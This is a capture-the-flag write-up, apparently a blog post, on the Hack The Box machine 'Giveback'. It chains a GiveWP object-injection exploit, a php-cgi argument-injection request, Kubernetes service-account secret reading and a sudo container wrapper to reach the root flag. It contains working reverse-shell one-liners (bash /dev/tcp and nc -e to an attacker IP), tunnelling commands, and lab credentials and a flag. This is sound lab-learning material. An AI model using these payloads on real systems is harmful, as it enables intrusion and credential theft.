---
title: '[HTB-WEB] Giveback'
date: '2026-06-25'
category: ctf
description: ''
tags:
  - htb
draft: false
---

# Giveback: From a Donation Form to Kubernetes Secrets and a Host Flag

Giveback’s public WordPress site was only the first layer. A vulnerable GiveWP donation form yielded a shell in the WordPress container; internal services then led to a second container with Kubernetes API access. A cluster secret opened an SSH account on the host, where an administrative wrapper could be persuaded to run an OCI container configuration that read the root flag.

## The public donation form

The host `10.10.11.94` exposed SSH on port 22, nginx and WordPress on port 80, and a separate Go HTTP service on port 30686. I focused on `giveback.htb` and enumerated the WordPress installation:

~~~bash
wpscan --url http://giveback.htb/ -e vp,u
~~~

The site had GiveWP 3.14.0 and a donation page at `/donations/the-things-we-need/`. That version fell within the affected range of CVE-2024-5932, an object-injection issue involving untrusted donation data. WPScan identified the installed plugin version; without a vulnerability API token, it did not itself prove exploitability. The proof was the callback from the researcher’s RCE demonstration:

~~~bash
git clone https://github.com/EQSTLab/CVE-2024-5932.git
cd CVE-2024-5932
python3 -m venv myven
source myven/bin/activate
pip3 install -r requirements.txt
nc -lnvp 9001
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "bash -c 'bash -i >& /dev/tcp/10.10.15.85/9001 0>&1'"
~~~

The shell landed in the WordPress container, `beta-vino-wp-wordpress-667654664c-hfrrg`. Configuration exposed the database host `beta-vino-wp-mariadb:3306`, database `bitnami_wordpress`, user `bn_wordpress`, and password `sW5sp4spa3u7RLyetrekE4oS`. I queried the WordPress user records:

~~~bash
mysql -u bn_wordpress --password=sW5sp4spa3u7RLyetrekE4oS \
  -h beta-vino-wp-mariadb -D bitnami_wordpress \
  -e 'select user_login,user_pass,user_email from wp_users'
~~~

The `user` record had hash `$P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP.`. It was a password hash, not a usable plaintext password, so I continued enumerating the container and its neighbors. Credentials in `/proc/1/root/secrets` included `user:O8F7KR5zGi`, but that pair did not authenticate to WordPress.

## Reaching the internal CMS

Enumeration exposed the Kubernetes API at `10.43.0.1:443` and an internal legacy CMS at `10.43.2.241:5000`. I moved `chisel` into the container and forwarded the internal web port to my local machine:

~~~bash
# On my machine
chisel server -p 8000 --reverse

# In the WordPress container
./chisel client 10.10.15.85:8000 R:5000:10.43.2.241:5000
~~~

The forwarded site at `127.0.0.1:5000` mentioned legacy CGI handling retained during a migration from Windows IIS to Linux. A request to `/cgi-bin/php-cgi` was followed by a callback to my listener on port 4444:

~~~bash
nc -lnvp 4444
curl "http://127.0.0.1:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
  -d "nc 10.10.15.85 4444 -e sh"
~~~

The callback shell reported `uid=0(root)` inside another container. The recorded request and result establish the lab behavior, but the notes do not expose the CMS’s server-side CGI wrapper. In particular, CVE-2024-4577 describes a Windows character-conversion issue; the Linux migration note alone does not prove that the host was vulnerable to that Windows-specific flaw. The important result here was access to the internal container.

## The service account’s secret

Inside that container I found the mounted Kubernetes service-account files:

~~~text
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/token
~~~

The token identified `secret-reader-sa` in the `default` namespace. I used its bearer token and CA certificate to request namespace secrets from the API:

~~~bash
cd /var/run/secrets/kubernetes.io/serviceaccount
curl -s -H "Authorization: Bearer $(cat token)" --cacert ca.crt \
  "https://10.43.0.1/api/v1/namespaces/$(cat namespace)/secrets"
~~~

One result, `user-secret-babywyrm`, contained `MASTERPASS` as the base64 value `dVU2QWF3Y0wxdGdkT3pkYzBhZ0Vsclk4NU1uQ0ZYOQ==`. Decoding it produced `uU6AawcL1tgdOzdc0agElrY85MnCFX9`:

~~~bash
printf '%s' 'dVU2QWF3Y0wxdGdkT3pkYzBhZ0Vsclk4NU1uQ0ZYOQ==' | base64 -d
ssh babywyrm@giveback.htb
~~~

The password worked for `babywyrm` on the host. The name seen during WordPress enumeration and the secret name made the account worth trying, but the successful SSH login was the confirmation.

## Understanding the debug wrapper

`sudo -l` showed that `babywyrm` could invoke `/opt/debug`. The wrapper requested an administrative password in addition to validating the account. The string it accepted was:

~~~text
c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
~~~

That value is the *single* base64 encoding of the WordPress database password `sW5sp4spa3u7RLyetrekE4oS`. Encoding the exact bytes without a trailing newline reproduces it:

~~~bash
printf '%s' 'sW5sp4spa3u7RLyetrekE4oS' | base64
~~~

After the wrapper accepted the value, I used its `run` operation with an OCI bundle under `~/readflag`. The configuration ran `/bin/cat /root/root.txt` as UID 0 and bound the host’s `/root` into the bundle:

~~~bash
mkdir -p ~/readflag/rootfs
cd ~/readflag
cat > config.json <<'EOF'
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/dev", "type": "tmpfs", "source": "tmpfs",
     "options": ["nosuid", "strictatime", "mode=755", "size=65536k"]},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind", "ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind", "ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind", "ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind", "ro"]},
    {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind", "ro"]}
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"}, {"type": "network"}, {"type": "ipc"},
      {"type": "uts"}, {"type": "mount"}
    ]
  }
}
EOF
sudo /opt/debug run revshell
~~~

Although the run name was `revshell`, the process in this configuration was `cat`. The wrapper printed the contents of `/root/root.txt`: `f6b3b0dda0194fbe2baf5eb32d9a76e1`. This demonstrated privileged host-file access through the wrapper, rather than an interactive host root shell.

The route depended on several distinct boundaries: public PHP object injection, reachability of an internal CGI service, a service account authorized to read a Kubernetes secret, reuse of that secret for host SSH, and a debug wrapper that accepted a derivable administrative password before executing a user-supplied container bundle.

Further reading: [EQSTLab’s GiveWP research and PoC](https://github.com/EQSTLab/CVE-2024-5932) and [DEVCORE’s analysis of CVE-2024-4577](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/).
